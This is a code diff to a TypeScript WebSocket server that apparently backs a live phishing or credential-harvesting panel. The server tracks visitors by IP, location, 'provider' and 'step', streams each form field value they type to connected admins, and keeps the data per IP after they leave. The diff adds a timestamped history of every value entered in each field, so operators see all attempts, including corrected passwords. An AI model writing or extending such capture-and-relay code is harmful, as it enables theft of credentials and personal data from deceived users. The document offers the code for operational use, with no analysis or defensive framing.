@@ -10,6 +10,12 @@ interface Location {
   flag: string;
 }
 
+interface FormEntry {
+  field: string;
+  value: string;
+  ts: number;
+}
+
 interface Visitor {
   id: string;
   ws: WebSocket;
@@ -20,6 +26,7 @@ interface Visitor {
   userAgent: string;
   connectedAt: number;
   formData: Record<string, string>;
+  formHistory: FormEntry[];
 }
 
 interface VisitorPublic {
@@ -31,10 +38,12 @@ interface VisitorPublic {
   userAgent: string;
   connectedAt: number;
   formData: Record<string, string>;
+  formHistory: FormEntry[];
 }
 
 interface PersistedSession {
   formData: Record<string, string>;
+  formHistory: FormEntry[];
   provider: string;
   location: Location;
   userAgent: string;
@@ -95,12 +104,18 @@ function relayToViews(visitorId: string, data: object) {
 }
 
 function toPublic(v: Visitor): VisitorPublic {
-  return { id: v.id, ip: v.ip, location: v.location, provider: v.provider, step: v.step, userAgent: v.userAgent, connectedAt: v.connectedAt, formData: { ...v.formData } };
+  return {
+    id: v.id, ip: v.ip, location: v.location, provider: v.provider,
+    step: v.step, userAgent: v.userAgent, connectedAt: v.connectedAt,
+    formData: { ...v.formData },
+    formHistory: [...v.formHistory],
+  };
 }
 
 function persistVisitor(v: Visitor) {
   persistedByIP.set(v.ip, {
     formData: { ...v.formData },
+    formHistory: [...v.formHistory],
     provider: v.provider,
     location: v.location,
     userAgent: v.userAgent,
@@ -161,21 +176,25 @@ export function setupWebSocket(server: Server) {
               if (visitor) {
                 if (!field || field === '*') {
                   visitor.formData = {};
+                  visitor.formHistory = [];
                   const persisted = persistedByIP.get(visitor.ip);
-                  if (persisted) persisted.formData = {};
+                  if (persisted) { persisted.formData = {}; persisted.formHistory = []; }
                   broadcastToAdmins({ type: 'visitor-form-data-deleted', id: vid, field: '*' });
                 } else {
                   delete visitor.formData[field];
+                  visitor.formHistory = visitor.formHistory.filter(e => e.field !== field);
                   const persisted = persistedByIP.get(visitor.ip);
-                  if (persisted) delete persisted.formData[field];
+                  if (persisted) {
+                    delete persisted.formData[field];
+                    persisted.formHistory = persisted.formHistory.filter(e => e.field !== field);
+                  }
                   broadcastToAdmins({ type: 'visitor-form-data-deleted', id: vid, field });
                 }
               } else {
-                // visitor already disconnected; wipe from persisted only
                 const persisted = persistedByIP.get(ip);
                 if (persisted) {
-                  if (!field || field === '*') persisted.formData = {};
-                  else delete persisted.formData[field];
+                  if (!field || field === '*') { persisted.formData = {}; persisted.formHistory = []; }
+                  else { delete persisted.formData[field]; persisted.formHistory = persisted.formHistory.filter(e => e.field !== field); }
                 }
               }
 
@@ -224,6 +243,7 @@ export function setupWebSocket(server: Server) {
             userAgent: (msg['userAgent'] as string) || '',
             connectedAt: Date.now(),
             formData: persisted ? { ...persisted.formData } : {},
+            formHistory: persisted ? [...persisted.formHistory] : [],
           };
           visitors.set(id, visitor);
           broadcastToAdmins({ type: 'visitor-joined', visitor: toPublic(visitor) });
@@ -247,8 +267,10 @@ export function setupWebSocket(server: Server) {
               if (v) {
                 const field = m['field'] as string;
                 const value = m['value'] as string;
+                const ts = Date.now();
                 v.formData[field] = value;
-                broadcastToAdmins({ type: 'visitor-form-data', id, field, value });
+                v.formHistory.push({ field, value, ts });
+                broadcastToAdmins({ type: 'visitor-form-data', id, field, value, ts });
                 persistVisitor(v);
               }
             }
